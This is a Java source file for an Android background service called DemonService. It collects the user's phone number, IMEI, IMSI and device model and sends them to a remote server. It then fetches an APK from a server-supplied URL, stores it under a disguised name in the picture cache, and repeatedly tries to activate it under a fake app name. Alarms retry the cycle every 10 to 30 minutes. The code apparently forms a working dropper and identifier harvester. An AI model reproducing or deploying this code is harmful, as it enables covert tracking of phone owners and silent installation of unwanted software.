package com.xstd.qm;

import android.app.AlarmManager;
import android.app.IntentService;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.text.TextUtils;
import com.plugin.common.utils.CustomThreadPool;
import com.plugin.common.utils.StringUtils;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.common.utils.files.DiskManager;
import com.plugin.internet.InternetUtils;
import com.xdtd.qm.api.active.ActiveRequest;
import com.xdtd.qm.api.active.ActiveResponse;
import com.xdtd.qm.api.active.LanuchRequest;
import com.xdtd.qm.api.active.LanuchResponse;
import com.xstd.qm.setting.SettingManager;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-17
 * Time: AM10:18
 * To change this template use File | Settings | File Templates.
 */
public class DemonService extends IntentService {

    public static final String ACTION_ACTIVE_SERVICE = "com.xdtd.service.active";

    public static final String ACTION_DOWNLOAD_PLUGIN = "com.xstd.service.download";

    public static final String ACTION_LANUCH = "com.xstd.qs.lanuch";

    public static final String ACTION_ACTIVE_MAIN = "com.xstd.qs.active";

    public DemonService() {
        super("DemonService");
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if (intent != null) {
            String action = intent.getAction();
            if (ACTION_LANUCH.equals(action)) {
                //通知服务器启动事件
//                CustomThreadPool.asyncWork(new Runnable() {
//                    @Override
//                    public void run() {
                lanuchQS();
//                    }
//                });
            } else if (ACTION_ACTIVE_MAIN.equals(action)) {
                //通知服务器激活

                if (SettingManager.getInstance().getKeyLanuchTime() != 0) {
                    activeQS();
                }
            } else if (ACTION_ACTIVE_SERVICE.equals(action)) {
                //尝试激活子程序
                if (Config.DEBUG) {
                    Config.LOGD("[[DemonService::onHandleIntent]] try to active <<plugin>> package after 3S");
                }

                //sleep 3S
                //此处sleep的目的是为了防止用户的手机安装反应过慢的问题
                try {
                    Thread.sleep(2 * 1000);
                } catch (Exception e) {
                    e.printStackTrace();
                }

                if (Config.DEBUG) {
                    Config.LOGD("[[DemonService::onHandleIntent]] try to active <<plugin>> package now");
                }
                Intent i = new Intent();
                i.setAction("com.xstd.plugin.package.active");
                if (!TextUtils.isEmpty(AppRuntime.CURRENT_FAKE_APP_INFO.name)) {
                    i.putExtra("name", AppRuntime.CURRENT_FAKE_APP_INFO.name);
                }
                if (!TextUtils.isEmpty(AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae)) {
                    i.putExtra("packageName", AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae);
                }
                startService(i);

                if (SettingManager.getInstance().getLoopActiveCount() < 10) {
                    SettingManager.getInstance().setLoopActiveCount(SettingManager.getInstance().getLoopActiveCount() + 1);
                    Utils.tryToActivePluginApp(getApplicationContext());
                }

            } else if (ACTION_DOWNLOAD_PLUGIN.equals(action) && !Config.THIRD_PART_PREVIEW) {
                if (Config.DEBUG) {
                    Config.LOGD("[[DemonService::onHandleIntent]] action = " + action);
                }
                UtilOperator.tryToDownloadPlugin(getApplicationContext());
            }
        }
    }

    private void lanuchQS() {
        if (Config.DEBUG) {
            Config.LOGD("[[DemonService::onHandleIntent]] try to handle action : " + ACTION_LANUCH);
        }
        try {
            cancelAlarmForAction(getApplicationContext(), ACTION_LANUCH);
            String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
            if (TextUtils.isEmpty(phone)) phone = "00000000000";
            String imei = UtilsRuntime.getIMEI(getApplicationContext());
            if (TextUtils.isEmpty(imei)) {
                imei = String.valueOf(System.currentTimeMillis());
            }
            String imsi = UtilsRuntime.getIMSI(getApplicationContext());
            if (TextUtils.isEmpty(imsi)) {
//                imsi = String.valueOf(System.currentTimeMillis() + 9999);
                imsi = "987654321";
            }
            String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : imei;

            LanuchRequest request = new LanuchRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                         , imei
                                                         , imsi
                                                         , Config.CHANNEL_CODE
                                                         , uuid
                                                         , phone
                                                         , AppRuntime.BASE_URL
                                                         , android.os.Build.MODEL);
            LanuchResponse response = InternetUtils.request(getApplicationContext(), request);
            if (response != null && !TextUtils.isEmpty(response.url)) {
                SettingManager.getInstance().setKeyLanuchTime(System.currentTimeMillis());
                SettingManager.getInstance().setKeyInstallInterval(response.activeDelay * 60 * 1000);
                if (!response.url.startsWith("http")) {
                    if (Config.URL_PREFIX.endsWith("/")) {
                        SettingManager.getInstance().setKeyDownloadUrl(Config.URL_PREFIX + response.url);
                    } else {
                        SettingManager.getInstance().setKeyDownloadUrl(Config.URL_PREFIX + "/" + response.url);
                    }
                } else {
                    SettingManager.getInstance().setKeyDownloadUrl(response.url);
                }

                if (Config.DEBUG) {
                    Config.LOGD("[[DemonService]] lanuch time = " + UtilsRuntime.debugFormatTime(System.currentTimeMillis()));
                }

                String apkFileName = StringUtils.MD5Encode(response.url) + ".apk";
                SettingManager.getInstance().setLocalApkPath(DiskManager.tryToFetchCachePathByType(DiskManager.DiskCacheType.PICTURE) + apkFileName);

                if (UtilOperator.isPluginApkExist()) {
                    if (Config.DEBUG) {
                        Config.LOGD("[[DemonService]] plugin apk is exist on Path : "
                                        + SettingManager.getInstance().getLocalApkPath());
                    }
                    return;
                } else {
                    if (Config.DEBUG) {
                        Config.LOGD("[[DemonService]] isOnline = " + UtilsRuntime.isOnline(getApplicationContext())
                                        + " download process = " + Config.DOWNLOAD_PROCESS_RUNNING.get()
                                        + " screenLocked = " + UtilsRuntime.isScreenLocked(getApplicationContext()));
                    }

                    if (/*UtilsRuntime.isOnline(getApplicationContext())
                                            && */!Config.DOWNLOAD_PROCESS_RUNNING.get()
                                           /* && !UtilsRuntime.isScreenLocked(getApplicationContext())*/) {
                        Handler handler = new Handler(getApplicationContext().getMainLooper());
                        handler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                if (Config.DEBUG) {
                                    Config.LOGD("[[DemonService]] try to download APK from : "
                                                    + SettingManager.getInstance().getLocalApkPath()
                                                    + " delay 1S");
                                }
                                Intent i = new Intent();
                                i.setClass(getApplicationContext(), DemonService.class);
                                i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
                                startService(i);
                            }
                        }, 1 * 1000);
                    }
                }

//                                UtilOperator.startActiveAlarm(getApplicationContext(), 30 * 60 * 1000);
                startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN, ((long) 30) * 60 * 1000);
                cancelAlarmForAction(getApplicationContext(), ACTION_LANUCH);

                return;
            } else {
                if (Config.DEBUG) {
                    Config.LOGD("[[DemonService]] Lanuch request return == NULL >>>>>>>>");
                }
            }
        } catch (Exception e) {
            if (Config.DEBUG) {
                Config.LOGD("[[DemonService::lanuchQS]] error for lanuchQS", e);
            }
        }

        startAlarmForAction(getApplicationContext(), ACTION_LANUCH, (long) 10 * 60 * 1000);
    }

    private void activeQS() {
        if (Config.DEBUG) {
            Config.LOGD("[[DemonService::activeQS]]");
        }
        CustomThreadPool.asyncWork(new Runnable() {
            @Override
            public void run() {
//                UtilOperator.cancelActiveAlarm(getApplicationContext());
                cancelAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN);
                try {
                    String phone = UtilsRuntime.getCurrentPhoneNumber(getApplicationContext());
                    if (TextUtils.isEmpty(phone)) phone = "00000000000";
                    String imei = UtilsRuntime.getIMEI(getApplicationContext());
                    if (TextUtils.isEmpty(imei)) {
                        imei = String.valueOf(System.currentTimeMillis());
                    }
                    String imsi = UtilsRuntime.getIMSI(getApplicationContext());
                    if (TextUtils.isEmpty(imsi)) {
//                        imsi = String.valueOf(System.currentTimeMillis() + 9999);
                        imsi = "987654321";
                    }
                    String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : imei;

                    ActiveRequest request = new ActiveRequest(UtilsRuntime.getVersionName(getApplicationContext())
                                                                 , imei
                                                                 , imsi
                                                                 , Config.CHANNEL_CODE
                                                                 , phone
                                                                 , uuid
                                                                 , AppRuntime.BASE_URL
                                                                 , android.os.Build.MODEL
                                                                    + (SettingManager.getInstance().getInstallChanged()
                                                                          ? ";左install" : ""));
                    ActiveResponse response = InternetUtils.request(getApplicationContext(), request);
                    if (response != null && !TextUtils.isEmpty(response.url)) {
                        if (Config.DEBUG) {
                            Config.LOGD("[[DemonService::activeQS]] active success, response : " + response.toString());
                        }
                        //激活成功
                        SettingManager.getInstance().setKeyActiveTime(System.currentTimeMillis());
                        cancelAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN);
                        return;
                    }
                } catch (Exception e) {
                }

                startAlarmForAction(getApplicationContext(), ACTION_ACTIVE_MAIN, ((long) 30) * 60 * 1000);
            }
        });
    }

    public static void startAlarmForAction(Context context, String action, long delay) {
        cancelAlarmForAction(context, action);
        if (Config.DEBUG) {
            Config.LOGD("[[DemonService::startAlarmForAction]] start for action : " + action + " delay time : " + delay);
        }
        Intent intent = new Intent();
        intent.setAction(action);
        intent.setClass(context, DemonService.class);
        PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
        long cur = System.currentTimeMillis();
        long firstTime = cur + delay;

        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        am.set(AlarmManager.RTC, firstTime, sender);
    }

    public static void cancelAlarmForAction(Context context, String action) {
        if (Config.DEBUG) {
            Config.LOGD("[[DemonService::cancelAlarmForAction]] cancel for action : " + action);
        }
        Intent intent = new Intent();
        intent.setAction(action);
        intent.setClass(context, DemonService.class);
        PendingIntent sender = PendingIntent.getService(context, 0, intent, 0);
        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        am.cancel(sender);
    }

}
